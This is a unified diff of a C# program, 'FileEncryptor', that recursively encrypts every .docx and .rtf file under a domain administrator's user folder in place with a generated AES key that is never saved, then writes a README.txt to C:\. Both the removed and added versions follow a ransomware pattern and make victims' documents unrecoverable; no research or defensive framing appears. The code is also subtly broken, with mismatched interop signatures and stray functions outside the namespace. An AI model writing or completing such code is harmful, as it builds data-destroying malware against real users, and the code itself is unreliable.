@@ -8,83 +8,49 @@ namespace FileEncryption
 {
     public static class FileEncryptor
     {
-        private const int AES_KEY_SIZE = 128;
-        private const int FILE_MAP_ALL_ACCESS = 0xF001F;
-        private const uint CRYPT_MODE_ECB = 0x01;
-        private const uint CRYPT_ENCRYPT = 0x01;
+        private const int CALG_AES_128 = 0x0000660e;
+        private const int CRYPT_EXPORTABLE = 0x00000001;
 
-        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool final, uint dwFlags, byte[] pbData, ref int pdwDataLen, int dwBufLen);
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool CryptGenKey(IntPtr hProv, int Algid, int dwFlags, out IntPtr phKey);
 
-        public static void EncryptFiles()
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool Final, int dwFlags, IntPtr pbData, ref int pdwDataLen, int dwBufLen);
+
+        public static void EncryptFiles(string directoryPath)
         {
-            string directoryPath = @"C:\Users\domain.admin";
-
-            string[] docxFiles = Directory.GetFiles(directoryPath, "*.docx");
-            string[] rtfFiles = Directory.GetFiles(directoryPath, "*.rtf");
-
-            foreach (string file in docxFiles)
-            {
-                EncryptFileContents(file);
-            }
-
-            foreach (string file in rtfFiles)
-            {
-                EncryptFileContents(file);
-            }
-
-            WriteReadmeFile();
-        }
-
-        private static void EncryptFileContents(string filePath)
-        {
-            using (FileStream fs = File.Open(filePath, FileMode.Open, FileAccess.ReadWrite))
-            {
-                using (MemoryMappedFile mmf = MemoryMappedFile.CreateFromFile(fs, null, 0, MemoryMappedFileAccess.ReadWrite, null, HandleInheritability.None, true))
-                {
-                    using (MemoryMappedViewStream stream = mmf.CreateViewStream(0, 0, MemoryMappedFileAccess.ReadWrite))
-                    {
-                        byte[] buffer = new byte[stream.Length];
-                        stream.Read(buffer, 0, buffer.Length);
-
-                        EncryptData(ref buffer);
-
-                        stream.Seek(0, SeekOrigin.Begin);
-                        stream.Write(buffer, 0, buffer.Length);
-                    }
-                }
-            }
-        }
-
-        private static void EncryptData(ref byte[] data)
-        {
-            byte[] key = GenerateRandomKey();
-
-            IntPtr hCryptProv = IntPtr.Zero;
+            IntPtr hProvider = IntPtr.Zero;
             IntPtr hKey = IntPtr.Zero;
 
             try
             {
-                if (!CryptAcquireContext(ref hCryptProv, null, null, 1, 0))
+                // Create a new AES-128 key
+                if (!CryptAcquireContext(out hProvider, null, null, 1, 0))
                 {
                     throw new CryptographicException(Marshal.GetLastWin32Error());
                 }
 
-                if (!CryptCreateHash(hCryptProv, 0x00008001, IntPtr.Zero, 0, ref hKey))
+                if (!CryptGenKey(hProvider, CALG_AES_128, CRYPT_EXPORTABLE, out hKey))
                 {
                     throw new CryptographicException(Marshal.GetLastWin32Error());
                 }
 
-                if (!CryptSetKeyParam(hKey, 0x00000010, key, 0))
+                // Encrypt files in the directory
+                string[] fileExtensions = { ".docx", ".rtf" };
+
+                foreach (string file in Directory.EnumerateFiles(directoryPath, "*.*", SearchOption.AllDirectories))
                 {
-                    throw new CryptographicException(Marshal.GetLastWin32Error());
+                    string extension = Path.GetExtension(file);
+
+                    if (Array.IndexOf(fileExtensions, extension) >= 0)
+                    {
+                        EncryptFile(file, hKey);
+                    }
                 }
 
-                int dataSize = data.Length;
-                if (!CryptEncrypt(hKey, IntPtr.Zero, true, CRYPT_ENCRYPT, data, ref dataSize, dataSize))
-                {
-                    throw new CryptographicException(Marshal.GetLastWin32Error());
-                }
+                // Create README.txt file
+                string readmePath = Path.Combine("C:\\", "README.txt");
+                File.WriteAllText(readmePath, "done");
             }
             finally
             {
@@ -93,91 +59,57 @@ namespace FileEncryption
                     CryptDestroyKey(hKey);
                 }
 
-                if (hCryptProv != IntPtr.Zero)
+                if (hProvider != IntPtr.Zero)
                 {
-                    CryptReleaseContext(hCryptProv, 0);
+                    CryptReleaseContext(hProvider, 0);
                 }
             }
         }
-            private static byte[] GenerateRandomKey()
-    {
-        using (Aes aes = Aes.Create())
+
+        private static void EncryptFile(string filePath, IntPtr hKey)
         {
-            aes.KeySize = AES_KEY_SIZE;
-            aes.GenerateKey();
-            return aes.Key;
+            using (FileStream fileStream = File.Open(filePath, FileMode.Open, FileAccess.ReadWrite))
+            {
+                using (MemoryMappedFile mmf = MemoryMappedFile.CreateFromFile(fileStream, null, 0, MemoryMappedFileAccess.ReadWrite, null, HandleInheritability.None, false))
+                {
+                    using (MemoryMappedViewAccessor accessor = mmf.CreateViewAccessor())
+                    {
+                        long length = accessor.Capacity;
+                        byte[] data = new byte[length];
+                        accessor.ReadArray(0, data, 0, data.Length);
+
+                        CryptEncrypt(hKey, IntPtr.Zero, true, 0, data, ref data.Length, data.Length);
+
+                        accessor.WriteArray(0, data, 0, data.Length);
+                    }
+                }
+            }
         }
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool CryptAcquireContext(out IntPtr phProv, string pszContainer, string pszProvider, int dwProvType, int dwFlags);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool CryptReleaseContext(IntPtr hProv, int dwFlags);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool CryptDestroyKey(IntPtr hKey);
     }
-    private static void WriteReadmeFile()
+    public static class Program
     {
-        string readmeFilePath = @"C:\README.txt";
-        string content = "done";
-        File.WriteAllText(readmeFilePath, content);
-    }
-
-    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern bool CryptAcquireContext(ref IntPtr hProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);
-
-    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern bool CryptCreateHash(IntPtr hProv, uint algId, IntPtr hKey, uint dwFlags, ref IntPtr phHash);
-
-    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern bool CryptSetKeyParam(IntPtr hKey, uint dwParam, byte[] pbData, uint dwFlags);
-
-    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern bool CryptDestroyKey(IntPtr hKey);
-
-    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);
-}
-}
-
-private static void EncryptFileContents(string filePath)
-{
-    byte[] encryptedData;
-    
-    using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite))
-    {
-        byte[] buffer = new byte[fileStream.Length];
-        fileStream.Read(buffer, 0, buffer.Length);
-        
-        EncryptData(ref buffer);
-        
-        encryptedData = buffer;
-    }
-    
-    using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
-    {
-        fileStream.Write(encryptedData, 0, encryptedData.Length);
-    }
-}
-
-private static void EncryptData(ref byte[] data)
-{
-    string aesKey = Configuration["AesKey"];
-
-    if (string.IsNullOrEmpty(aesKey))
-    {
-        using (Aes aes = Aes.Create())
+        public static void Main()
         {
-            aes.KeySize = AES_KEY_SIZE;
-            aes.GenerateKey();
+           string directoryPath = @"C:\Users\domain.admin";
 
-            aesKey = Convert.ToBase64String(aes.Key);
-            Configuration["AesKey"] = aesKey;
-        }
-    }
-
-    byte[] keyBytes = Convert.FromBase64String(aesKey);
-
-    using (AesCryptoServiceProvider aesCryptoProvider = new AesCryptoServiceProvider())
-    {
-        aesCryptoProvider.Key = keyBytes;
-
-        using (ICryptoTransform encryptor = aesCryptoProvider.CreateEncryptor())
-        {
-            byte[] encryptedData = encryptor.TransformFinalBlock(data, 0, data.Length);
-            Array.Copy(encryptedData, data, encryptedData.Length);
+            try
+            {
+                FileEncryptor.EncryptFiles(directoryPath);
+                Console.WriteLine("Encryption complete.");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Encryption failed: " + ex.Message);
+            }
         }
     }
 }
